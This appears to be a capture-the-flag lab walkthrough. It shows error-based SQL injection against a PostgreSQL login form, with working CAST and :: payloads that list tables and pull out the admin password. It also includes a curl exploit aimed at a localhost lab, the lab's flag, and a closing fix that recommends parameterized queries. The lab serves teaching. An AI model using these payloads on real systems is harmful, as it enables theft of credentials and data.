<h4>Step 1: Test Normal Login</h4>
<p>
    Try logging in with an invalid password to see the normal failure response.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Login</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>admin<br>
        <span class="prompt">Password: </span>wrong<br>
        <span class="prompt">SQL&gt; </span>SELECT id, username, role FROM users WHERE username = 'admin' AND password = 'wrong'<br><br>
        <span class="prompt">Response: </span><strong>Login Failed.</strong> Invalid username or password.
    </div>
</div>

<h4>Step 2: Confirm Injection. Trigger Error</h4>
<p>
    Inject a single quote to break the SQL syntax. The application displays
    PostgreSQL error messages: this is our data exfiltration channel.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>'<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span><strong>ERROR: syntax error at or near "anything"</strong>
    </div>
</div>

<p>The error message confirms the input is injectable and errors are displayed.</p>

<h4>Step 3: Understand CAST Error-Based Extraction</h4>
<p>
    When PostgreSQL tries to cast a string to an integer, the error message includes the actual
    string value. This is the core technique:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CAST Concept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">SQL: </span>SELECT CAST('hello' AS INTEGER);<br>
        <span class="prompt">Error: </span>invalid input syntax for type integer: "hello"<br>
        <span class="prompt">Leak: </span>The value "hello" appears in the error message!
    </div>
</div>

<h4>Step 4: Enumerate Tables</h4>
<p>
    Use the CAST technique to discover what tables exist in the database.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. List Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INTEGER) --<br>
        <span class="prompt">Password: </span>x<br><br>
        <span class="prompt">Error: </span><strong>ERROR: invalid input syntax for type integer: "users"</strong>
    </div>
</div>

<h4>Step 5: Extract the Admin Password (Flag)</h4>
<p>
    Now extract the admin's password using the CAST error technique.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --<br>
        <span class="prompt">Password: </span>x<br><br>
        <span class="prompt">Error: </span><strong>ERROR: invalid input syntax for type integer: "FLAG{pg_c4st_typ3_3rr0r}"</strong>
    </div>
</div>

<p>The flag <code>FLAG{pg_c4st_typ3_3rr0r}</code> is leaked directly in the error message!</p>

<h4>Step 6: Alternative: :: Cast Syntax via Password Field</h4>
<p>
    PostgreSQL supports <code>::</code> as shorthand for <code>CAST()</code>. You can also
    inject via the password field instead.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Alternative with :: Syntax</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>admin<br>
        <span class="prompt">Password: </span>' OR 1=((SELECT password FROM users WHERE username='admin')::INTEGER) --<br><br>
        <span class="prompt">Error: </span><strong>ERROR: invalid input syntax for type integer: "FLAG{pg_c4st_typ3_3rr0r}"</strong>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_c4st_typ3_3rr0r}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab3" \<br> --data-urlencode "username=' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --" \<br>
        &nbsp;&nbsp;--data-urlencode "password=x"<br><br>
        <span class="prompt">Output:</span><br>
        <strong>PostgreSQL Error:</strong> ERROR: invalid input syntax for type integer: "FLAG{pg_c4st_typ3_3rr0r}"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Error-based SQL injection in PostgreSQL abuses type casting.
    When a string value is cast to <code>INTEGER</code>, PostgreSQL includes the offending value
    in the error message, leaking data one query at a time. PostgreSQL supports both <code>CAST(x AS INTEGER)</code>
    and the shorthand <code>x::INTEGER</code>. The fix: use parameterized queries and never display
    raw database errors to users. Use <code>pg_query_params()</code> with <code>$1, $2</code> placeholders.
</div>
